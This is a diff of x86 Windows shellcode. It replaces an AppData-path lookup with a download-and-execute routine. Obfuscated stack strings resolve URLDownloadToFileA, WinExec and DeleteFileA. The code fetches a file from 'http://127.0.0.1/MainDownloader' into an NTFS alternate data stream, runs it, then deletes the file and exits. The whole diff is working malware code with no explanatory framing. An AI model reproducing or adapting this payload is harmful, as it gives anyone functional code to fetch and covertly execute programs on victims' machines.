@@ -53,28 +53,49 @@ pop ecx                                ; ECX = 0
 push eax                               ; EAX = LoadLibrary
 
 xor eax, eax
-mov eax, 0x236c6c64
+mov ax, 0x6c6c
 push eax
-sub dword [esp + 3], 0x23
-push 0x2e32336c
-push 0x6c656873
+push 0x642e6e6f
+push 0x6d6c7275
 push esp                               ; String on the stack
 call [esp + 16]
 add esp, 12
 push eax                               ; DLL base on the stack
 
-; GetProcAddress(shell32.dll, SHGetFolderPathA)
-
-xor eax, eax                           ; EAX = 0
-push eax                               ; NULL on the stack
-push 0x41687461
-push 0x50726564
-push 0x6c6f4674
-push 0x65474853
+xor eax, eax
+mov ax, 0x4165
+push eax
+push 0x6c69466f
+push 0x5464616f
+push 0x6c6e776f
+push 0x444c5255
 push esp                               ; String on the stack
 push dword [esp + 24]
 call [esp + 36]
 add esp, 20
+push eax                               ; Function address on the stack
+
+xor eax, eax
+mov eax, 0x23636578
+push eax
+sub dword [esp + 3], 0x23
+push 0x456e6957
+push esp                               ; String on the stack
+push dword [esp + 28]
+call [esp + 28]
+add esp, 8
+push eax                               ; Function address on the stack
+
+xor eax, eax
+mov eax, 0x2341656c
+push eax
+sub dword [esp + 3], 0x23
+push 0x69466574
+push 0x656c6544
+push esp                               ; String on the stack
+push dword [esp + 36]
+call [esp + 36]
+add esp, 12
 push eax                               ; Function address on the stack
 
 xor eax, eax
@@ -84,21 +105,90 @@ sub dword [esp + 3], 0x23
 push 0x636f7250
 push 0x74697845
 push esp                               ; String on the stack
-push dword [esp + 32]
-call [esp + 32]
+push dword [esp + 40]
+call [esp + 40]
 add esp, 12
-
-sub esp, 0xFC                          ; Allocate memory on the stack
 push eax                               ; Function address on the stack
-; load the memory address of register esp and add 0x100 to it, then push it on the stack
-lea eax, [esp + 0x04]
+
+xor eax, eax
+mov eax, 0x23726564
 push eax
-xor eax, eax                            ; EAX = 0
-push eax                                ; NULL on the stack
-push 0x1d                               ; CSIDL_APPDATA
-xor eax, eax                            ; EAX = 0
-push eax                                ; NULL on the stack
-call [ESP + 20]                         ; Call SHGetFolderPathA
+sub dword [esp + 3], 0x23
+push 0x616f6c6e
+push 0x776f446e
+push 0x69614d2f
+push 0x312e302e
+push 0x302e3732
+push 0x312f2f3a
+push 0x70747468
+push esp
+
+xor eax, eax
+mov al, 0x72
+push eax
+push 0x6564616f
+push 0x6c6e776f
+push 0x643a6578
+push 0x652e7265
+push 0x64616f6c
+push 0x6e776f44
+push 0x6e69614d
+push esp
+
+xor eax, eax
+push eax
+xor eax, eax
+push eax
+push dword [ESP + 8]
+push dword [ESP + 48]
+xor eax, eax
+push eax
+call [ESP + 104]
+add ESP, 72
+xor eax, eax
+mov al, 0x72
+push eax
+push 0x6564616f
+push 0x6c6e776f
+push 0x643a6578
+push 0x652e7265
+push 0x64616f6c
+push 0x6e776f44
+push 0x6e69614d
+push esp
+
+xor eax, eax
+push eax
+push dword [ESP + 4]
+call [ESP + 52]
+add ESP, 36
+xor eax, eax
+mov al, 0x72
+push eax
+push 0x6564616f
+push 0x6c6e776f
+push 0x643a6578
+push 0x652e7265
+push 0x64616f6c
+push 0x6e776f44
+push 0x6e69614d
+push esp
+
+push dword [ESP + 0]
+call [ESP + 44]
+add ESP, 36
+xor eax, eax
+mov ax, 0x6578
+push eax
+push 0x652e7265
+push 0x64616f6c
+push 0x6e776f44
+push 0x6e69614d
+push esp
+
+push dword [ESP + 0]
+call [ESP + 32]
+add ESP, 24
 xor eax, eax
 push eax
 call [ESP + 4]
